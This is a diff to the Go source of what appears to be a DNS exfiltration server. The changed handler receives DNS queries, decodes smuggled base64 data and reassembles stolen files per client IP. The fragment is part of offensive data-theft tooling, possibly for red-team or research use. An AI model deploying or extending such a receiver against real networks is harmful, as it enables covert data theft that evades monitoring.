@@ -74,11 +74,11 @@ func (ex *dnsExfiltrator) HandleDnsRequests(udpServer *net.UDPConn, nameServer s
 		}()
 		data := strings.ReplaceAll(msg, ".", "")
 
-		clientDir := path.Join(EXFILTRATION_DIR, clientAddr.String())
+		clientDir := path.Join(EXFILTRATION_DIR, clientAddr.IP.String())
 
 		// Initialise the inner map if uninitialised.
-		if _, ok := ex.openFiles[clientAddr.String()]; !ok {
-			ex.openFiles[clientAddr.String()] = make(map[string]*os.File)
+		if _, ok := ex.openFiles[clientAddr.IP.String()]; !ok {
+			ex.openFiles[clientAddr.IP.String()] = make(map[string]*os.File)
 		}
 
 		switch msgType {
@@ -86,11 +86,11 @@ func (ex *dnsExfiltrator) HandleDnsRequests(udpServer *net.UDPConn, nameServer s
 			fileutils.CreateDirIfNotExists(clientDir)
 			filename := getFilePathFromEncodedFilename(clientDir, data)
 			file := fileutils.CreateFileIfNotExists(filename)
-			ex.openFiles[clientAddr.String()][filename] = file
+			ex.openFiles[clientAddr.IP.String()][filename] = file
 		case DNS_FILE_END.String():
 			filename := getFilePathFromEncodedFilename(clientDir, data)
-			file := ex.openFiles[clientAddr.String()][filename]
-			decodedData := decodeFromModifiedBase64(string(ex.unprocessedData[clientAddr.String()]))
+			file := ex.openFiles[clientAddr.IP.String()][filename]
+			decodedData := decodeFromModifiedBase64(string(ex.unprocessedData[clientAddr.IP.String()]))
 			_, err := file.Write(decodedData)
 			if err != nil {
 				log.Fatalln(err)
@@ -100,7 +100,7 @@ func (ex *dnsExfiltrator) HandleDnsRequests(udpServer *net.UDPConn, nameServer s
 				log.Fatalln(err)
 			}
 		case DNS_FILE_DATA.String():
-			ex.unprocessedData[clientAddr.String()] = append(ex.unprocessedData[clientAddr.String()], data...)
+			ex.unprocessedData[clientAddr.IP.String()] = append(ex.unprocessedData[clientAddr.IP.String()], data...)
 		default:
 			log.Printf("Unknown message type: '%s'", msgType)
 		}
